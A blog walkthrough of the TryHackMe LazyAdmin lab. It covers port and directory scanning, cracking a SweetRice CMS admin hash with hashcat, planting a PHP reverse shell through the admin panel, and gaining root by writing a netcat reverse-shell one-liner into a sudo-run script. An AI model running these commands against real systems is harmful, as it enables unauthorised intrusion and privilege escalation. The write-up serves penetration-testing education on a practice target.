### TryHackMe Walkthrough: LazyAdmin

<div id="copyUrl"></div>

In this blog post, I'll walk you through my experience tackling the <a href="https://tryhackme.com/r/room/lazyadmin" target="_blank">TryHackMe LazyAdmin</a> room. It's an engaging challenge that will take us from reconnaissance to gaining root access. If you're eager to learn about network scanning, password cracking, and privilege escalation, read on!

To kick things off, I connected to the TryHackMe network using OpenVPN on my Kali virtual machine. With the target machine up and running, I started with an **_Nmap_** scan to identify open ports and services:

<pre class="bg-body-tertiary border p-2 shadow-sm">nmap -sV -vv &lt;remote-ip&gt;</pre>

The scan revealed two open ports: SSH (22) and HTTP (80).

Navigating to the website's homepage, I found the default Apache login page with nothing of interest in the source pre. To uncover any hidden directories, I ran a **_Gobuster_** scan using the common.txt wordlist:

<pre class="bg-body-tertiary border p-2 shadow-sm">gobuster dir -u http://&lt;remote-ip&gt; -w /usr/share/wordlists/dirb/common.txt</pre>

This scan unveiled a few directories, with `/content` catching my eye. Inside, I discovered the installation page for a CMS called SweetRice.

To find more hidden gems, I ran another **_Gobuster_** scan within the `/content` directory:

<pre class="bg-body-tertiary border p-2 shadow-sm">gobuster dir -u http://&lt;remote-ip&gt;/content -w /usr/share/wordlists/dirb/common.txt</pre>

This revealed additional directories, including `/as` (a login page) and `/inc` (holding some promising files). Among these, the `mysql_backup` directory contained a backup file, which I promptly downloaded.

Inside the backup file, I found an MD5 hashed password. To crack it, I used **_hashcat_** with the rockyou.txt wordlist:

<pre class="bg-body-tertiary border p-2 shadow-sm">hashcat -m 0 pash /usr/share/wordlists/rockyou.txt</pre>

Within moments, I had the password in plain text.

With the cracked password, I logged into the SweetRice admin panel. From here, I needed to leverage my access to get a reverse shell. I found an Ads page where I could inject a **_PHP reverse shell_** from PentestMonkey. After replacing the IP and port with my own, I saved it.

I started a Netcat listener on my machine to catch the reverse shell:

<pre class="bg-body-tertiary border p-2 shadow-sm">rlwrap nc -lvnp 4444</pre>

Navigating to the shell file in the `/inc/ads` directory executed my shell, and my listener caught it. I upgraded my shell using Python for better interaction:

<pre class="bg-body-tertiary border p-2 shadow-sm">python -c 'import pty; pty.spawn("/bin/bash")'</pre>

Listing the users on the machine, I found a user named _itguy_ and accessed their directory to retrieve the user flag.

To escalate privileges, I listed my sudo permissions:

<pre class="bg-body-tertiary border p-2 shadow-sm">sudo -l</pre>

I could run a Perl script called `backup.pl`, which in turn executed `copy.sh`. This copy.sh script contained a reverse shell, and I replaced its IP and port with my own using echo:

<pre class="bg-body-tertiary border p-2 shadow-sm">echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <your IP> 4444 >/tmp/f' > /etc/copy.sh</pre>

After starting another Netcat listener, I executed the Perl script:

<pre class="bg-body-tertiary border p-2 shadow-sm">sudo /usr/bin/perl /home/itguy/backup.pl</pre>

My listener caught the shell, and I had root access. I navigated to the root directory and retrieved the root flag.

Lessons Learned:

- Always look for publicly accessible directories and files.
- Check for scripts executable by sudo for privilege escalation.

The LazyAdmin room was a thrilling experience that tested my skills in various aspects of cybersecurity. From initial access through backup file exploitation to escalating privileges using a cleverly placed script, it was a comprehensive exercise.

If you enjoyed this walkthrough or have any questions, feel free to reach out. Happy hacking!

For more insights and detailed explorations into the world of cybersecurity, visit [CipherVoyage](https://vickie-ks.github.io/CipherVoyage/) and stay updated with the latest in cyber defense strategies.

_Author: <a href="https://github.com/vickie-ks" target="_blank">vickie-ks</a>_
